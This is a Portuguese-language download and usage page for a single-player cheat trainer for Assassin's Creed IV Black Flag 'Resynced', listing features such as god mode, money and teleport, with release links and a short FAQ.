...
God Mode, HP infinito, reales, Jackdaw, teleporte, one-hit e mais.
...
> Link direto do ZIP do release:

**→ [Baixar AC.Black.Flag.Resynced.BlackSails.Trainer.zip](https://github.com/TrainerHubMoggyDay/Assassins-Creed-Black-Flag-Resynced-GodMode-Money-Jackdaw-Teleport/releases/download/v1.0.0/AC.Black.Flag.Resynced.BlackSails.Trainer.zip)**

Também no **VGtimes**:  
**→ [Post no VGtimes — Assassin's Creed Black Flag Resynced](https://vgtimes.ru/games/assassins-creed-black-flag-resynced/files/96329-assassins-creed-black-flag-resynced.html)**
...
1. Inicie **Assassin's Creed IV Black Flag** (build **ACBFResynced**)
2. Inicie o trainer
3. Aguarde a conexão com `ACBlackFlag.exe`
4. Escolha a categoria: Kenway / Jackdaw / Combat / Economy / World
5. Ative com **NumPad** ou interruptores
6. Idioma da UI: **EN** / **RU**
...
**Onde baixar?**  
Botão verde ou [ZIP direto](https://github.com/TrainerHubMoggyDay/Assassins-Creed-Black-Flag-Resynced-GodMode-Money-Jackdaw-Teleport/releases/download/v1.0.0/AC.Black.Flag.Resynced.BlackSails.Trainer.zip). Também [VGtimes](https://vgtimes.ru/games/assassins-creed-black-flag-resynced/files/96329-assassins-creed-black-flag-resynced.html).

**God Mode / dinheiro / teleporte / Jackdaw?**  
Sim — veja recursos e o vídeo.

**Interface em russo?**  
Sim — interruptor **RU** embaixo.

---

## Aviso

Apenas single-player. Autor e [TrainerHub MoggyDay](https://github.com/TrainerHubMoggyDay) não se responsabilizam. Não use online.
